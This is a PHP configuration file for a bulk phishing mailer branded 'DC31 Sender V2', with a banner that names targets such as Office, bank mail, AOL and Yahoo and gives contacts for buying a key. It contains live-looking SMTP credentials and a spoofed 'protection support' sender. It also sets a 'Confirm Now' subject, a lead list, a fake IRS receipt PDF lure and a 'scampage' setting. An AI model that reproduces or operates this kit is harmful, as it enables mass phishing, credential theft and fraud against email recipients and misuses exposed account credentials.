<?php
//
// ██╗   ██╗██╗ ██████╗████████╗ ██████╗ ██████╗     ██╗   ██╗██████╗  
// ██║   ██║██║██╔════╝╚══██╔══╝██╔═══██╗╚════██╗    ██║   ██║╚════██╗
// ██║   ██║██║██║        ██║   ██║   ██║ █████╔╝    ██║   ██║ █████╔╝
// ██╗╚ ██╔╝██║██║        ██║   ██║   ██║ ╚═══██╗    ╚██╗ ██╔╝██╔═══╝ 
//  ╚████╔╝ ██║╚██████╗   ██║   ╚██████╔╝██████╔╝     ╚████╔╝ ███████╗
//   ╚═══╝  ╚═╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═════╝       ╚═══╝  ╚══════╝
//⚚ 𝓥𝓲𝓬𝓽𝓸𝓻 𝓢𝓪𝓷𝓭𝓮𝓻 𝓞𝓕𝓕𝓲𝓬𝓮 𝓑𝓪𝓷𝓴 𝓜𝓪𝓲𝓵 𝓒𝓸𝓶𝓬𝓪𝓼𝓽 𝓐𝓸𝓵 ↭ 𝓨𝓪𝓱𝓸𝓸 2023 ⚚    
//████████SETTINGS██████████████████████████████████████████████████████        
//     █                                                     
//     █       SSL&TLS : ON                
//     █▀▀FILES▀▀▀▀▀▀▀▀▀▀▀▀▀▀█            Copyright © DC31 Sender 2023  
//     █ Smtp   : Active     █    █▀▀ABOUT▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█ 
//     █ Leads  : Emails.txt █▀▀▀▀█ Latest Version Of DC31 Sender V2            █   
//     █ Letter : DC31.html  █    █ Your Key  : Get it from the contact           █
//     █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█    █ CONTACT US Icq : 7002 & Telegram : DC31 █  
//                                █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█  
//		       
//		  		 (C) 2023 | THE BEST SENDER DC31 V2 (NG)


/* SMTP SETUP */
$smtp_acc = [
    [
"host"     => "smtp.office365.com",
"port"     => "587",
"username" => "protectionsupportdikanudfh37r5331@prijatno.org",
"password" => "Gok00587"

    ],
];
/* Features SETUP */

$gx_setup = [
    "priority"       => 1,
    "userandom"      => 0,
    "sleeptime"      => 2,
    "replacement"    => 1,
    "filesend"       => 1,
    "userremoveline" => 0,
    "mail_list"      => "Emails.txt",
    "fromname"       => "protection support",
    "frommail"       => "protectionsupportdikanudfh37r5331@prijatno.org",
    "subject"        => "Confirm Now",
    "msgfile"        => "letter/Office.html",
    "filepdf"        => "file/attachment/Receipt-Token_ServTaxIRS-Gov.pdf",
    "scampage"       => ["https://hootsuite.com"],
];
